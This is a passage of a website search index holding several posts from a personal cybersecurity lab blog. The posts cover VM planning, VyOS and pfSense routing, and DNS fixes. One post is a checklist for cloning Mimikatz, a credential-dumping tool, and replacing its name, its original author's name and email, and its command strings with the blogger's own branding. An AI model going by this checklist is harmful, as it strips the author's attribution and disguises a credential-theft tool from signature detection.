routing in follow-on phases.\nüìö Prerequisites VMware Workstation Pro (or equivalent hypervisor) Host system with at least 64GB RAM and 1TB storage Basic familiarity with virtual machine deployment Target VMs downloaded: Windows 10, Kali Linux, pfSense, Ubuntu Server ‚úÖ Tasks This Phase Define OPFORGE project structure: E:/OPFORGE/VMs/ with subfolders by role Download and validate OS images from trusted sources Deploy base VMs: opf-mbr01 (Windows endpoint) opf-blue01 (SIFT workstation) opf-red01 (Kali Linux) opf-fw-dmz (pfSense firewall) opf-dc01 (Domain Controller) Plan logical subnets for future segmentation Design base lab network using VMware custom VMnets üîß Configuration Highlights VM Folder Structure E:/OPFORGE/VMs/ ‚îú‚îÄ‚îÄ Endpoints/ ‚îÇ ‚îú‚îÄ‚îÄ OPF-MBR01 ‚îÇ ‚îî‚îÄ‚îÄ OPF-BLUE01 ‚îú‚îÄ‚îÄ Infrastructure/ ‚îÇ ‚îú‚îÄ‚îÄ OPF-DC01 ‚îÇ ‚îî‚îÄ‚îÄ OPF-FW-DMZ ‚îú‚îÄ‚îÄ Attack/ ‚îÇ ‚îî‚îÄ‚îÄ OPF-RED01 VM Network Plan (Initial Draft) VM Role IP Range VMnet Assigned OPF-MBR01 Workstation 192.168.60.0/24 VMnet6 OPF-BLUE01 Blue Team Tools 192.168.60.0/24 VMnet6 OPF-RED01 Attack Platform 192.168.10.0/24 VMnet2 OPF-FW-DMZ Firewall Multi-Zone VMnet4, VMnet5 OPF-DC01 Domain Services 192.168.30.0/24 VMnet3 üåü Key Takeaways A clear file and folder structure supports long-term lab sustainability Early VM deployment sets the stage for future segmentation and attack simulation Planning subnets early simplifies routing and firewall implementation later üß≠ On Deck Implement routing via VyOS to enable inter-subnet communication Configure pfSense interfaces and NAT rules Begin testing DNS and AD join for opf-mbr01 From the first VM clone to the final lateral movement, OPFORGE begins with purpose.\nH.Y.P.R. ","permalink":"https://opforge.dev/posts/opforge_post_1_genesis/","summary":"\u003cblockquote\u003e\n\u003cp\u003e\u0026ldquo;First say to yourself what you would be; and then do what you have to do.\u0026rdquo; ‚Äî Epictetus\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch1 id=\"-genesis-of-opforge\"\u003eüöÄ Genesis of OPFORGE\u003c/h1\u003e\n\u003cp\u003eThe launch of OPFORGE marks the deliberate beginning of a long-range effort to build a portfolio-driven, enterprise-grade cyber operations lab. This post documents the rationale, guiding principles, and initial actions to set up the OPFORGE lab environment using VMware Workstation Pro.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"-abstract\"\u003eüìå Abstract\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eProblem Statement:\u003c/strong\u003e Many cyber professionals lack a personalized, practical testbed to validate tools, emulate adversaries, and showcase capabilities. OPFORGE fills that gap through structured lab design.\u003c/p\u003e","title":"Post 1: Genesis of OPFORGE"},{"content":"üîß About OPFORGE OPFORGE is a purpose-built, full-spectrum cyber operations lab designed to fuse red team emulation, blue team detection, and AI/ML integration into a living portfolio of validated cybersecurity capabilities.\nOriginally created as a threat emulation testbed, OPFORGE has evolved into a scalable platform for demonstrating hands-on technical depth across disciplines‚Äîanchored to certifications, graduate-level research, and operational experience.\nüéØ Mission To transform certifications, technical expertise, and advanced academic learning into working cyber capability, with real artifacts, modular infrastructure, and educational value.\nüîç What Makes OPFORGE Different ‚úÖ Certification-Aligned ‚Äì Each component is mapped to a professional certification like OSCP, GCFA, GREM, GXPN, CISSP, GPYC, PMP, and more. üîÑ Red ‚Üî Blue Integration ‚Äì Supports bidirectional learning through emulation and detection validation workflows. ü§ñ AI/ML Integration ‚Äì Purpose-built to host anomaly detection, explainable AI, and cyber data science pipelines. üß≠ Built in Phases ‚Äì Progress is captured in a public blog series‚Äîtransparent, modular, and iterative. üìö Portfolio-Ready ‚Äì Designed for professional storytelling, resume support, and mentorship use. üß± Current Phase (June 2025) üåê RED_NET segment is operational with internet egress via routed VyOS chain üß† Blog series launched to chronicle phased lab build and skill integration üîÑ Routing structure being extended to support segmented zones (EXT, DMZ, INT) üìä Log pipeline to OpenSearch is in early deployment phase üìÅ Artifact documentation and GitHub repo alignment in progress üí° Who It\u0026rsquo;s For Cyber professionals building a practical portfolio Learners aligning certifications to real-world skill Recruiters or hiring managers seeking tangible proof of ability Technologists focused on threat-informed defense and detection engineering üõ†Ô∏è Created \u0026amp; Maintained By A cybersecurity practitioner with experience across red team, blue team, detection engineering, and threat emulation. Certified in OSCP, CISSP, GCFA, GREM, GXPN, and more. Currently pursuing a Master of Science in Artificial Intelligence \u0026amp; Machine Learning.\nLearn more, read the blog, or explore artifacts at OPFORGE.dev\n","permalink":"https://opforge.dev/about/","summary":"\u003ch1 id=\"-about-opforge\"\u003eüîß About OPFORGE\u003c/h1\u003e\n\u003cp\u003e\u003cstrong\u003eOPFORGE\u003c/strong\u003e is a purpose-built, full-spectrum cyber operations lab designed to fuse red team emulation, blue team detection, and AI/ML integration into a living portfolio of validated cybersecurity capabilities.\u003c/p\u003e\n\u003cp\u003eOriginally created as a threat emulation testbed, OPFORGE has evolved into a scalable platform for demonstrating hands-on technical depth across disciplines‚Äîanchored to certifications, graduate-level research, and operational experience.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"-mission\"\u003eüéØ Mission\u003c/h2\u003e\n\u003cp\u003eTo \u003cstrong\u003etransform certifications, technical expertise, and advanced academic learning into working cyber capability\u003c/strong\u003e, with real artifacts, modular infrastructure, and educational value.\u003c/p\u003e","title":"About OPFORGE"},{"content":"OPFORGE Network Internet Access Setup Guide This guide outlines the configuration steps used to enable full internet access from the Red Network within the OPFORGE lab environment. It includes configuration of VyOS routers opf-rtred and opf-rt-inet, as well as ensuring connectivity from a host such as opf-lnx01.\nüîß 1. opf-rt-inet Configuration (Internet Gateway) Interfaces eth0: 192.168.10.2/24 (RED_NET) eth1: 192.168.1.25/24 (WAN - External/Internet-facing) Commands configure # Set interface IPs (if not set) set interfaces ethernet eth0 address 192.168.10.2/24 set interfaces ethernet eth1 address 192.168.1.25/24 # Default route to WAN gateway set protocols static route 0.0.0.0/0 next-hop 192.168.1.1 # Enable NAT for RED_NET to WAN set nat source rule 100 outbound-interface eth1 set nat source rule 100 source address 192.168.10.0/24 set nat source rule 100 translation address masquerade # Enable DNS forwarding set service dns forwarding listen-address 192.168.10.2 set service dns forwarding allow-from 192.168.10.0/24 set service dns forwarding name-server 1.1.1.1 set service dns forwarding name-server 8.8.8.8 commit save exit üîß 2. opf-rtred Configuration (Red Network Router) Interfaces eth0: 192.168.10.1/24 (RED_NET) Commands configure # Set static default route to forward traffic to opf-rt-inet set protocols static route 0.0.0.0/0 next-hop 192.168.10.2 # Set DNS resolver to point to opf-rt-inet set system name-server 192.168.10.2 commit save exit üß™ 3. opf-lnx01 or Red Network Host Ensure the following are configured on your RED_NET endpoints:\nExample /etc/resolv.conf nameserver 192.168.10.2 Test Connectivity ping 8.8.8.8 ping google.com ‚úÖ Verification Checklist Device Internet (8.8.8.8) DNS Resolution (google.com) opf-rt-inet ‚úÖ ‚úÖ opf-rtred ‚úÖ ‚úÖ opf-lnx01 ‚úÖ ‚úÖ Author: Alfredo Pelaez\nDate: 2025-06-12\nLab: OPFORGE ‚Äì Threat Emulation \u0026amp; Detection Validation\n","permalink":"https://opforge.dev/posts/opforge-internet-setup/","summary":"\u003ch1 id=\"opforge-network-internet-access-setup-guide\"\u003eOPFORGE Network Internet Access Setup Guide\u003c/h1\u003e\n\u003cp\u003eThis guide outlines the configuration steps used to enable full internet access from the Red Network within the OPFORGE lab environment. It includes configuration of VyOS routers \u003ccode\u003eopf-rtred\u003c/code\u003e and \u003ccode\u003eopf-rt-inet\u003c/code\u003e, as well as ensuring connectivity from a host such as \u003ccode\u003eopf-lnx01\u003c/code\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"-1-opf-rt-inet-configuration-internet-gateway\"\u003eüîß 1. \u003ccode\u003eopf-rt-inet\u003c/code\u003e Configuration (Internet Gateway)\u003c/h2\u003e\n\u003ch3 id=\"interfaces\"\u003eInterfaces\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eeth0\u003c/code\u003e: 192.168.10.2/24 (RED_NET)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eeth1\u003c/code\u003e: 192.168.1.25/24 (WAN - External/Internet-facing)\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"commands\"\u003eCommands\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003econfigure\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Set interface IPs (if not set)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset interfaces ethernet eth0 address 192.168.10.2/24\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset interfaces ethernet eth1 address 192.168.1.25/24\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Default route to WAN gateway\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset protocols static route 0.0.0.0/0 next-hop 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Enable NAT for RED_NET to WAN\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset nat source rule \u003cspan style=\"color:#ae81ff\"\u003e100\u003c/span\u003e outbound-interface eth1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset nat source rule \u003cspan style=\"color:#ae81ff\"\u003e100\u003c/span\u003e source address 192.168.10.0/24\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset nat source rule \u003cspan style=\"color:#ae81ff\"\u003e100\u003c/span\u003e translation address masquerade\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Enable DNS forwarding\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset service dns forwarding listen-address 192.168.10.2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset service dns forwarding allow-from 192.168.10.0/24\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset service dns forwarding name-server 1.1.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset service dns forwarding name-server 8.8.8.8\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecommit\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esave\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eexit\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"-2-opf-rtred-configuration-red-network-router\"\u003eüîß 2. \u003ccode\u003eopf-rtred\u003c/code\u003e Configuration (Red Network Router)\u003c/h2\u003e\n\u003ch3 id=\"interfaces-1\"\u003eInterfaces\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eeth0\u003c/code\u003e: 192.168.10.1/24 (RED_NET)\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"commands-1\"\u003eCommands\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003econfigure\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Set static default route to forward traffic to opf-rt-inet\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset protocols static route 0.0.0.0/0 next-hop 192.168.10.2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Set DNS resolver to point to opf-rt-inet\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset system name-server 192.168.10.2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecommit\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esave\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eexit\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"-3-opf-lnx01-or-red-network-host\"\u003eüß™ 3. \u003ccode\u003eopf-lnx01\u003c/code\u003e or Red Network Host\u003c/h2\u003e\n\u003cp\u003eEnsure the following are configured on your RED_NET endpoints:\u003c/p\u003e","title":"OPFORGE Network Internet Access Setup Guide"},{"content":"OPFORGE Rebrand Checklist for Mimikatz This step-by-step guide simplifies the process of rebranding Mimikatz under the OPFORGE project. Use it to create a portfolio-grade build aligned with Threat Emulation, Detection Engineering, and Explainable AI objectives.\nMaintainer: Alfredo Pelaez\nDate: 2025-05-31\nProject Alignment: OPFORGE | High-Yield Performance \u0026amp; Results (H.Y.P.R.) Mindset\n‚úÖ Phase 1: Clone and Prepare the Repo Clone the Mimikatz repository:\ngit clone --recursive https://github.com/gentilkiwi/mimikatz.git Tools/mimikatz Create a backup copy:\ncp -r Tools/mimikatz Tools/mimikatz-original Prepare script path and workspace:\nNew-Item -Path \u0026#34;C:\\OPFORGE\\Scripts\u0026#34; -ItemType Directory -Force ‚úÖ Phase 2: Automated Rebranding via PowerShell Run the global text replacement:\n$root = \u0026#34;C:\\OPFORGE\\Tools\\mimikatz\u0026#34; Get-ChildItem -Path $root -Recurse -File | ForEach-Object { (Get-Content $_.FullName) ` -replace \u0026#34;mimikatz\u0026#34;, \u0026#34;opforge\u0026#34; ` -replace \u0026#34;Mimikatz\u0026#34;, \u0026#34;OPFORGE\u0026#34; ` -replace \u0026#34;MIMIKATZ\u0026#34;, \u0026#34;OPFORGE\u0026#34; ` -replace \u0026#34;gentilkiwi\u0026#34;, \u0026#34;opforge\u0026#34; ` -replace \u0026#34;Benjamin\u0026#34;, \u0026#34;Alfredo\u0026#34; ` -replace \u0026#34;Delpy\u0026#34;, \u0026#34;Pelaez\u0026#34; ` -replace \u0026#34;benjamin@gentilkiwi.com\u0026#34;, \u0026#34;alfredo@opforge.dev\u0026#34; ` | Set-Content $_.FullName } Rename key project files/folders:\nRename-Item \u0026#34;$root\\mimikatz.sln\u0026#34; \u0026#34;opforge.sln\u0026#34; Rename-Item \u0026#34;$root\\mimikatz\u0026#34; \u0026#34;opforge\u0026#34; Patch the solution file:\n(Get-Content \u0026#34;$root\\opforge.sln\u0026#34;) ` -replace \u0026#34;mimikatz.vcxproj\u0026#34;, \u0026#34;opforge.vcxproj\u0026#34; ` | Set-Content \u0026#34;$root\\opforge.sln\u0026#34; ‚úÖ Phase 3: Branding Customization Update terminal banner in opforge.c:\nkprintf(L\u0026#34;\\n OPFORGE Toolkit v1.0 | Threat Emulation | Detection Engineering | XAI\\n\u0026#34;); kprintf(L\u0026#34; H.Y.P.R. Mindset | https://opforge.dev | Maintainer: Alfredo Pelaez\\n\\n\u0026#34;); Modify the shell prompt:\nkprintf(L\u0026#34;\\nopforge # \u0026#34;); Optionally update:\nVersion macros about module text License headers ‚úÖ Phase 4: Build and Debug Open the solution in Visual Studio 2022.\nRetarget the solution:\nRight-click the solution ‚Üí Retarget Projects ‚Üí Select your installed toolset Set the startup project to opforge, build for x64 | Release.\nTroubleshoot build errors:\nResolve missing exports like kdbg_mimikatz Patch unresolved symbols Update the .def file to match your rebranded entry points ‚úÖ Phase 5: Validation and Use Run the final binary:\n.\\x64\\opforge.exe Confirm output:\nASCII art and terminal header are updated Interactive prompt shows opforge # All commands execute without errors Version control:\ngit add . git commit -m \u0026#34;Apply OPFORGE rebranding to Mimikatz base\u0026#34; git push origin opforge-main üß† Future Improvements Rename command strings via macro (L\u0026quot;sekurlsa\u0026quot; ‚Üí OPF_SEKURLSA) and refactor source Customize internal module help text Build .msi or .zip for OPFORGE deployment Integrate telemetry or logging for operator feedback (in lab only) End of Checklist\nThis post is part of the OPFORGE project series on Threat Emulation and AI-Enhanced Detection Engineering.\n","permalink":"https://opforge.dev/posts/2025-05-31-opforge_rebrand_checklist/","summary":"\u003ch1 id=\"opforge-rebrand-checklist-for-mimikatz\"\u003eOPFORGE Rebrand Checklist for Mimikatz\u003c/h1\u003e\n\u003cp\u003e\u003cem\u003eThis step-by-step guide simplifies the process of rebranding Mimikatz under the OPFORGE project. Use it to create a portfolio-grade build aligned with Threat Emulation, Detection Engineering, and Explainable AI objectives.\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eMaintainer\u003c/strong\u003e: Alfredo Pelaez\u003cbr\u003e\n\u003cstrong\u003eDate\u003c/strong\u003e: 2025-05-31\u003cbr\u003e\n\u003cstrong\u003eProject Alignment\u003c/strong\u003e: \u003ca href=\"https://opforge.dev\"\u003eOPFORGE\u003c/a\u003e | High-Yield Performance \u0026amp; Results (H.Y.P.R.) Mindset\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"-phase-1-clone-and-prepare-the-repo\"\u003e‚úÖ Phase 1: Clone and Prepare the Repo\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cinput disabled=\"\" type=\"checkbox\"\u003e Clone the Mimikatz repository:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit clone --recursive https://github.com/gentilkiwi/mimikatz.git Tools/mimikatz\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cinput disabled=\"\" type=\"checkbox\"\u003e Create a backup copy:\u003c/p\u003e","title":"OPFORGE Rebrand Checklist for Mimikatz"},{"content":"Background Originally, OPF-DC01 was deployed with an IP address in the CSOCINFRA (192.168.20.0/24) subnet. However, per OPFORGE\u0026rsquo;s logical segmentation, all domain services must reside in the ADINFRA (192.168.40.0/24) segment to maintain operational and architectural integrity.\nProblem OPF-DC01 had IP 192.168.20.100 (incorrect subnet). The gateway was misconfigured as 192.168.50.5 (C2 CONTROL). This broke domain service accessibility and violated the subnet\u0026rsquo;s trust boundary. Solution 1. Re-IP OPF-DC01 to ADINFRA New-NetIPAddress -InterfaceAlias \u0026#34;Ethernet0\u0026#34; ` -IPAddress \u0026#34;192.168.40.100\u0026#34; ` -PrefixLength 24 ` -DefaultGateway \u0026#34;192.168.40.5\u0026#34; 2. Update DNS Set-DnsClientServerAddress -InterfaceAlias \u0026#34;Ethernet0\u0026#34; -ServerAddresses \u0026#34;192.168.40.100\u0026#34; 3. Fix Default Route Remove-NetRoute -InterfaceAlias \u0026#34;Ethernet0\u0026#34; -NextHop 192.168.50.5 New-NetRoute -InterfaceAlias \u0026#34;Ethernet0\u0026#34; ` -DestinationPrefix \u0026#34;0.0.0.0/0\u0026#34; ` -NextHop \u0026#34;192.168.40.5\u0026#34; Results OPF-DC01 now properly resides at 192.168.40.100. Routing flows through opf-fw01 via gateway 192.168.40.5. It is ready to serve domain joins from endpoints like OPF-MBR01. ","permalink":"https://opforge.dev/posts/2025-05-27-opf-dc01-corrective-ip-alignment/","summary":"\u003ch2 id=\"background\"\u003eBackground\u003c/h2\u003e\n\u003cp\u003eOriginally, \u003ccode\u003eOPF-DC01\u003c/code\u003e was deployed with an IP address in the \u003ccode\u003eCSOCINFRA (192.168.20.0/24)\u003c/code\u003e subnet. However, per OPFORGE\u0026rsquo;s logical segmentation, all domain services must reside in the \u003ccode\u003eADINFRA (192.168.40.0/24)\u003c/code\u003e segment to maintain operational and architectural integrity.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"problem\"\u003eProblem\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eOPF-DC01\u003c/code\u003e had IP \u003ccode\u003e192.168.20.100\u003c/code\u003e (incorrect subnet).\u003c/li\u003e\n\u003cli\u003eThe gateway was misconfigured as \u003ccode\u003e192.168.50.5\u003c/code\u003e (C2 CONTROL).\u003c/li\u003e\n\u003cli\u003eThis broke domain service accessibility and violated the subnet\u0026rsquo;s trust boundary.\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"solution\"\u003eSolution\u003c/h2\u003e\n\u003ch3 id=\"1-re-ip-opf-dc01-to-adinfra\"\u003e1. Re-IP OPF-DC01 to ADINFRA\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eNew-NetIPAddress -InterfaceAlias \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Ethernet0\u0026#34;\u003c/span\u003e `\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  -IPAddress \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;192.168.40.100\u0026#34;\u003c/span\u003e `\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  -PrefixLength \u003cspan style=\"color:#ae81ff\"\u003e24\u003c/span\u003e `\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  -DefaultGateway \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;192.168.40.5\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"2-update-dns\"\u003e2. Update DNS\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSet-DnsClientServerAddress -InterfaceAlias \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Ethernet0\u0026#34;\u003c/span\u003e -ServerAddresses \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;192.168.40.100\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"3-fix-default-route\"\u003e3. Fix Default Route\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eRemove-NetRoute -InterfaceAlias \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Ethernet0\u0026#34;\u003c/span\u003e -NextHop \u003cspan style=\"color:#ae81ff\"\u003e192.168\u003c/span\u003e.50.5\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eNew-NetRoute -InterfaceAlias \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Ethernet0\u0026#34;\u003c/span\u003e `\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  -DestinationPrefix \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;0.0.0.0/0\u0026#34;\u003c/span\u003e `\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  -NextHop \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;192.168.40.5\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"results\"\u003eResults\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eOPF-DC01\u003c/code\u003e now properly resides at \u003ccode\u003e192.168.40.100\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eRouting flows through \u003ccode\u003eopf-fw01\u003c/code\u003e via gateway \u003ccode\u003e192.168.40.5\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eIt is ready to serve domain joins from endpoints like \u003ccode\u003eOPF-MBR01\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e","title":"Correcting OPF-DC01 Placement in ADINFRA Segment"},{"content":"üß© Problem Summary After placing OPF-DC01 into the ADINFRA subnet (192.168.40.0/24), OPF-MBR01 was unable to resolve public domains such as google.com. DNS requests to 192.168.40.100 (the DC) failed to resolve, even though routing to the firewall was functional.\nüîç Root Cause By default, OPF-DC01 was not forwarding DNS queries to a working upstream resolver. Attempted use of public DNS forwarders like 8.8.8.8 and 1.1.1.1 failed because OPF-DC01 had no internet access in the segmented lab setup.\n‚úÖ Solution Summary We aligned the DNS architecture with best practice by:\nKeeping OPF-DC01 isolated to ADINFRA (no internet). Forwarding external DNS requests to pfSense at 192.168.40.5. üîß Step-by-Step Fix 1. Update DNS Forwarders on OPF-DC01 Open DNS Manager Right-click the server ‚Üí Properties Go to Forwarders tab Remove any entries for 8.8.8.8 or 1.1.1.1 Add: 192.168.40.5 Then open PowerShell and run:\ndnscmd /clearcache 2. Ensure DNS Resolver is Active on pfSense Navigate to Services \u0026gt; DNS Resolver Ensure it is enabled and listens on all interfaces Optional:\nAdd 8.8.8.8 and 1.1.1.1 under System \u0026gt; General Setup \u0026gt; DNS Servers (for pfSense to reach the internet). 3. Verify from Domain Clients From OPF-MBR01:\nnslookup google.com 192.168.40.100 Test-NetConnection google.com -Port 443 Expected output:\nDNS resolved to public IP HTTPS port is reachable üìå Result Domain-joined workstations now use the domain controller for internal resolution, and the domain controller relies on the pfSense firewall for external resolution, mirroring realistic enterprise segmentation.\n","permalink":"https://opforge.dev/posts/2025-05-27-opf-dns-forwarding-infrastructure-fix/","summary":"\u003ch2 id=\"-problem-summary\"\u003eüß© Problem Summary\u003c/h2\u003e\n\u003cp\u003eAfter placing \u003ccode\u003eOPF-DC01\u003c/code\u003e into the \u003ccode\u003eADINFRA\u003c/code\u003e subnet (192.168.40.0/24), \u003ccode\u003eOPF-MBR01\u003c/code\u003e was unable to resolve public domains such as \u003ccode\u003egoogle.com\u003c/code\u003e. DNS requests to \u003ccode\u003e192.168.40.100\u003c/code\u003e (the DC) failed to resolve, even though routing to the firewall was functional.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"-root-cause\"\u003eüîç Root Cause\u003c/h2\u003e\n\u003cp\u003eBy default, \u003ccode\u003eOPF-DC01\u003c/code\u003e was not forwarding DNS queries to a working upstream resolver. Attempted use of public DNS forwarders like \u003ccode\u003e8.8.8.8\u003c/code\u003e and \u003ccode\u003e1.1.1.1\u003c/code\u003e failed because \u003ccode\u003eOPF-DC01\u003c/code\u003e had \u003cstrong\u003eno internet access\u003c/strong\u003e in the segmented lab setup.\u003c/p\u003e","title":"Fixing DNS Resolution in OPFORGE: Domain Forwarding via pfSense"},{"content":"üéØ Purpose In the OPFORGE lab, Chocolatey may 